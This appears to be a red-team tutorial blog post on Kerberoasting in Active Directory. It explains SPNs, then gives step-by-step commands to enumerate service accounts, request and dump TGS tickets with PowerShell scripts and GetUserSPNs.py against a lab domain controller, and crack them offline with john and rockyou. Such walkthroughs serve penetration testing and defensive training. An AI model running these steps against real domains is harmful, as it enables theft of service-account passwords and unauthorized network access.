---
title:  "Kerberos attacks Kerbroasting"
classes: wide
header:
  teaser: /img/redteampng.png
ribbon: red
description: "Kerberos attacks Kerbroasting -Offline cracking of service account passwords"
categories:
  - Red-Teaming
toc: true
---
## Goal
Crack weak service passwords
## SPN
The Service Principal Name (SPN) is a unique identifier for a service instance. 
Active Directory Domain Services and Windows provide support for Service Principal Names (SPNs), which are key components of the Kerberos mechanism through which a client authenticates a service.
used to associate a service on a specific server to a service account in AD
An SPN must be unique in the forest

## SPN Format

```
serviceclass/host:port servicename
MSSQLSvc/domainAD.karim.net:1443 karim\mssqlserver
```
serviceclass:
  * identifies the general class of service  for example, "SqlServer".There are well-known service class names such as "www" for a Web service or "ldap" for a directory service

HOST:
  * The name of the computer on which the service is running

port:	
  * An optional TCP or UDP port number to differentiate between multiple instances of the same service class on a single host computer
servicename
  * The distinguished name or objectGUID of an object in Active Directory Domain Services, such as a service connection point (SCP).
  * The DNS name of the domain for a service that provides a specified service for a domain as a whole.

## Kerbroasting
Kerberoasting is a technique that allows an attacker to steal the KRB_TGS ticket, to brute force application services hash to extract its password.

If you got a valid domain user, you may just ask the KDC to issue you a valid TGS for any service.
Knowing the fact that SPN attributes can be set to a specific username, and that the TGS is encrypted using service’s key

We can issue a TGS ticket on our own machine, dump the ticket and start an offline bruteforce attack against it to retrieve the plaintext password for that user (service account)

Any domain user can request tickets for any service
  * No high privileges required
  * Service must not be active


## SPN Discover
## Find-PotentiallyCrackableAccounts.ps1
```
download script: https://raw.githubusercontent.com/cyberark/RiskySPN/master/Find-PotentiallyCrackableAccounts.ps1
```
```
Import-Module .\Find-PotentiallyCrackableAccounts.ps1
Find-PotentiallyCrackableAccounts -FullData -Verbose
```

<img src="/img/kerberosting/11.PNG" alt="Getting-gz" width="800" height="200"> 
<img src="/img/kerberosting/12.PNG" alt="Getting-gz" width="800" height="200"> 


## GetUserSPNs.ps1
```
download script: https://raw.githubusercontent.com/nidem/kerberoast/master/GetUserSPNs.ps1
```
```
.\GetUserSPNs.ps1
```


<img src="/img/kerberosting/13.PNG" alt="Getting-gz" width="800" height="200"> 


## TGSCipher.ps1
Dump TGS ticket

```
download script:https://raw.githubusercontent.com/cyberark/RiskySPN/master/Get-TGSCipher.ps1
```
```
 Import-Module .\Get-TGSCipher.ps1
 Get-TGSCipher -SPN "MSSQLSvc/domainAD.karim.net:1443" -Format John
 ```
 
 <img src="/img/kerberosting/14.PNG" alt="Getting-gz" width="800" height="200"> 

 
 
 




## GetUserSPNs.py
find user account used as service account
```
python3 GetUserSPNs.py karim.net/admin:p@ssw0rd -dc-ip 192.168.128.140 
```
<img src="/img/kerberosting/1.PNG" alt="Getting-gz" width="800" height="200"> 



```
python3 GetUserSPNs.py karim.net/admin:p@ssw0rd -dc-ip 192.168.128.140 -request     
```

<img src="/img/kerberosting/error.PNG" alt="Getting-gz" width="800" height="200"> 

if you find this error from Linux: Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great) it because of your local time, you need to synchronise the host with the DC: ntpdate <IP of DC>
```
sudo ntpdate  192.168.128.140
```

<img src="/img/kerberosting/err2.PNG" alt="Getting-gz" width="800" height="200"> 


  
  
```
python3 GetUserSPNs.py karim.net/admin:p@ssw0rd -dc-ip 192.168.128.140 -request-user websvc
```
  
<img src="/img/kerberosting/2.PNG" alt="Getting-gz" width="800" height="200"> 

  
  
```
  john --wordlist=/usr/share/wordlists/rockyou.txt tgs
  ```
  
<img src="/img/kerberosting/.PNG" alt="Getting-gz" width="800" height="200"> 